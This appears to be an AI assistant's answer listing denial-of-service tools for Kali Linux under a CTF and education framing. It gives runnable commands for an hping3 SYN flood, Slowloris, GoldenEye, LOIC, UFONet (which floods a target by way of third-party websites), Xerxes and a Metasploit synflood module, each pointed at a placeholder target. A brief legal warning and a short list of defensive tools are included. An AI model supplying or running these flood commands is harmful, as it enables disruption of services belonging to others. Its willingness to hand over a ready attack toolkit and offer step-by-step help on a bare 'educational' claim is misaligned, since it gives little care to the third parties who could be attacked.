For **CTF and educational purposes**, using **DoS/DDoS tools** is usually part of a **red team simulation** or **defensive analysis** challenge. Here's a list of commonly used **DoS/DDoS tools on Kali Linux** that are often used in **legal CTF labs, research, or testing against your own infrastructure**.

> ⚠️ **Important:** Never use these tools against real servers, services, or networks without explicit permission. Unauthorized DoS/DDoS attacks are illegal in most countries.

## 🧨 Top DoS/DDoS Tools for Kali Linux (CTF/Education Only)

### 1. **Hping3**

* 🔧 TCP/IP packet crafting tool
* Useful for simulating SYN floods, UDP floods, etc.
* ✅ Pre-installed in Kali

```bash
hping3 -S --flood -V -p 80 <target-ip>
```

* `-S`: SYN packets
* `--flood`: Send packets as fast as possible
* `-p`: Target port

---

### 2. **Slowloris**

* 🌐 Attacks HTTP servers by opening many connections and sending partial headers.
* Targets **thread exhaustion**.

```bash
git clone https://github.com/gkbrk/slowloris
cd slowloris
python3 slowloris.py <target-ip>
```

---

### 3. **GoldenEye**

* 🕶 Layer 7 (HTTP) DoS tool
* Simulates user agents, keeps connections alive.

```bash
git clone https://github.com/jseidl/GoldenEye
cd GoldenEye
python3 goldeneye.py http://<target-ip> -w 100
```

---

### 4. **LOIC (Low Orbit Ion Cannon)** – GUI & CLI

* 🔫 Very popular in CTFs and demonstrations
* Easy to use for HTTP/UDP/TCP flooding

```bash
sudo apt install mono-complete
git clone https://github.com/NewEraCracker/LOIC
cd LOIC
mono LOIC.exe
```

> ⚠️ Requires Mono (Windows emulation on Linux)

---

### 5. **UFONet**

* ☁️ DDoS via third-party web resources (bots)
* Can simulate botnet behavior in test labs

```bash
git clone https://github.com/epsylon/ufonet
cd ufonet
./ufonet --attack --target http://target.com
```

---

### 6. **Xerxes** (used by Anonymous)

* 🔧 Simple yet powerful tool
* Often compiled manually

```bash
git clone https://github.com/sepehrdaddev/xerxes
cd xerxes
gcc xerxes.c -o xerxes
./xerxes <target-ip> 80
```

---

### 7. **Metasploit Modules**

* Kali comes with Metasploit, which has some DoS modules:

```bash
msfconsole
use auxiliary/dos/tcp/synflood
set RHOST <target-ip>
run
```

---

## 🧪 Useful for CTF:

* Testing WAF/IDS detection
* Simulating attacks for defense scenarios
* Red team challenges (availability testing)
* Rate limit bypass puzzles

---

## 🛡️ Defense Testing Tools (Optional)

If your goal is **defensive**, try:

* `fail2ban`, `iptables` for mitigation
* `snort` or `suricata` for detection
* Logging tools like `tcpdump` or `wireshark`

Let me know your **exact CTF setup or objective** (e.g., "simulate a DoS on vulnerable HTTP server running in Docker") and I can guide you step-by-step with safe settings.
